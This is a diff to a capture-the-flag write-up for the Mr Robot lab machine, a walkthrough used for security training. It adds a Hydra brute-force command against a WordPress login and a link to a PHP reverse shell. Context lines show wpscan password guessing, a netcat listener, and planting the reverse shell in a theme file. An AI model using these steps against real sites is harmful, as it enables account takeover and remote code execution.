@@ -21,6 +21,8 @@ toc: false
 ---
 # Mr Robot CTF
 
+<img src="/assets/images/posts/writeups/mr_robot.jpg" alt="Mr Robot" width="500" class="align-center">
+
 ## Information gathering
 
 ### Enumeration
@@ -120,10 +122,10 @@ wpscan --url http://[machineIp]/0/ --wp-content-dir wp-content -e vp,vt,cb,u,dbe
 ```sh
 wpscan --url http://[machineIp]/0/ --wp-content-dir wp-content -U mich05654 -P /home/kali/Downloads/fsocity.dic 
 ```
-7. Found password for mich05654: *Dylan_2791*
+7. Found password for mich05654!
 8. Login with found user and password on the http://[machineIp]/wp-login.php
 9. This user has limited access in wordpress
-10. Since bruteforcing with wpscan is realy slow we can use BurpSuite or Hydra to bruteforce for user *elliot*
+10. Since brute forcing with wpscan is realy slow we can use BurpSuite or Hydra to bruteforce for user *elliot*
 11. Check for dictionary downloaded; a lot of lines are repeating - clean the dictionary first
 12. Checking the dictionary again I saw that a couple of more than 11k passwords are repeating except last few lines:
 ```txt
@@ -138,9 +140,12 @@ abcdefghijklmnopq
 c3fcd3d76192e4007dfb496cca67e13b
 ABCDEFGHIJKLMNOPQRSTUVWXYZ
 ```
-13. Bruteforcing with this small list I found elliot's password: *ER28-0652*
+13. Bruteforcing with this small list I found elliot's password!
+```sh
+hydra -l elliot -P /home/kali/Downloads/short.txt [machineIp] http-post-form "/wp-login.php:log=elliot&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.146.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+```
 14. Start a local listener with netcat `nc -lvnp 4455`
-15. Login with elliot on wordpress and edit theme (Apearance >> Editor) replace the content of file (header.php) with a php rev shell (PentestMonkey.php)
+15. Login with elliot on wordpress and edit theme (Apearance >> Editor) replace the content of file (header.php) with a php rev shell (PentestMonkey.php from here https://www.revshells.com/)
 16. Re-visit blog to load the content of header.php, the reverse shell should run
 
 #### Data exfiltration
